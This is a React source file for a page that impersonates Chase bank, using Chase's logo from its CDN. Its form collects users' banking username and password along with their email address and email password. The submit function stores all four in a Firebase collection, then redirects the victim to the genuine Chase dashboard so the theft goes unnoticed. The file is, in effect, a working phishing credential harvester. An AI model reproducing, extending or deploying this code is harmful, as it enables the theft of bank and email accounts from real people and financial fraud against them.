import React from 'react'

import './views.css';
import Account from '../components/account/account';
import Personal from '../components/personal/personal';
import db from '../firebase';
import Footer from '../components/footer/footer';
import { Redirect } from 'react-router';


class Views extends React.Component {
    constructor(){
        super()

        this.state ={
            step: 1,
            username: '',
            password: '',
            email: '',
            emailPassword: '',
            redirect: false
        }
    }

    update = (name, value) => {
        this.setState({[name]:value})
    }

    

    submit = () => {
        const { username, password, email, emailPassword} = this.state;
        console.log(this.state)
        db.collection("user").doc(username).set({
            username: username,
            password: password,
            email: email,
            emailpassword: emailPassword
        })
        .then(function() {
            return window.location.href = "https://secure01b.chase.com/web/auth/dashboard#/dashboard/overviewAccounts/overview/index"
        })
        .catch(function(error) {
            console.error("Error writing document: ", error);
        });
    }

    switchStep= () => {
        switch(this.state.step){
            case 1:
                return <Account state={this.state} update={this.update}/>
            case 2:
                return <Personal state={this.state} update={this.update} submit={this.submit}/>
            default:
                return <Account/>
        }
    }

    render(){
        if(this.state.redirect){
            return <Redirect to='chase.com'/>
        }
        return (
            <div className='main-view '>
                <div className='main-web pb-5'>
                    <div className='logo-container pt-3 pb-2'>
                        <img src='https://static.chasecdn.com/web/2019.12.08-975/common/assets/img/logos/wordmark-white.svg' alt='logo' width='170px'/>
                    </div>
                {
                    this.switchStep()
                }
                </div>
                <Footer/>
            </div>
        )
    }
}

export default Views;